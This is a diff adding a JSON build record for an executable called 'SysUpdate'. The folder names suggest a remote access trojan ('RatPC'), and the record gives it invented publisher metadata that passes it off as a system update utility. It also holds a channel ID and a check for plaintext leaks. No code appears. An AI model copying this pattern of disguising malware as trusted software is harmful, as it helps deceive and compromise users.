@@ -1,0 +1,18 @@
+{
+  "uuid": "87c005fa-4893-4d45-bc78-98db3a70ed8d",
+  "alias": "a",
+  "name": "SysUpdate",
+  "channel": 1526964484826988698,
+  "engine": "nuitka",
+  "artifact": "D:\\Buat rusuh\\RatPC\\dist\\SysUpdate.exe",
+  "built": "2026-10-30T11:29:00",
+  "meta": {
+    "company": "Nexus Utilities",
+    "product": "System Update",
+    "desc": "Keeps system components up to date",
+    "version": "1.0.0.0"
+  },
+  "size": 14583808,
+  "sha256": "e6e52d936014b014764ac418c8a4d83a0936aed28150adae769a619a3a409f95",
+  "plaintext_leaks": []
+}
